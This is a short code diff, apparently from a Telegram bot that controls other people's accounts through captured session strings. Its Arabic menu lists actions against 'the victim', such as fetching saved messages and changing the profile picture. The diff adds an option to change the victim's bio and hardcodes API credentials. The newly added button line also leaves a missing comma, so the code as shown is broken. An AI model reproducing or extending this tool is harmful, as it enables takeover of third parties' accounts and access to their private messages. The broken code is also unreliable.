@@ -211,7 +211,7 @@ async def change_bio(strses, new_bio):
         except Exception as e:
             print(e)
             return False
-
+#mewo
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
@@ -260,6 +260,8 @@ menu = '''
 
 "V" ~ [جلب  الرسائل المحفوظه لدى الضحيه]
 
+"X" ~ [ تغير بايو حساب الضحية ]
+
 "Z" ~ [لتغيير صورة الحساب ] 
 '''
 mm = '''
@@ -288,6 +290,7 @@ keyboard = [
         Button.inline("N", data="N"),
         Button.inline("V", data="V"), # Added the V option to the menu
         Button.inline("Z", data="Z")
+        Button.inline("X", data="X")  # إضافة زر شفاف بحرف X
     ],
     [
         Button.url("سورس الساحر✨", "https://t.me/SXYO3")
